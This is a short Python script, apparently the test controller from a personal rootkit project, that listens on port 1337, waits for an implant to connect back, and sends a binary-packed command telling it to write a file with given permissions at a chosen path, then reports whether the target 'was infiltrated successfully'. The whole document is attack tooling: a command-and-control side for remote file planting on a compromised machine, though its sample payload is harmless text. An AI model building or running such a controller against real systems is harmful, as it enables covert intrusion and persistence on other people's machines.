#!/usr/bin/python

import socket
import struct

PORT = 1337
FILE_PATH = b'/home/ppeck/Desktop/Stuff/Cyber/Projects/rootkit/test\0'
CONTENT = b'Hello, World!\0'

req = struct.pack('<Q', len(FILE_PATH) + len(CONTENT) + 9 + 12)  + struct.pack('<B', 1)
req += struct.pack('<H', 0o644)
req += struct.pack('<H', len(FILE_PATH))
req += struct.pack('<Q', len(CONTENT))
req += FILE_PATH + CONTENT

server_sock = socket.socket()
server_sock.bind(('', PORT))
server_sock.listen(1)
client_sock, client_address = server_sock.accept()

client_sock.send(req)

res_len = struct.unpack('<I', client_sock.recv(4))[0]
print('Response length: ' + str(res_len))

client_sock.recv(1)

status = struct.unpack('<B', client_sock.recv(1))[0]
print('Response status code: ' + str(status))

file_path = FILE_PATH.decode()

if status == 0:
    print(file_path + ' was infiltrated successfully!')

server_sock.close()
client_sock.close()
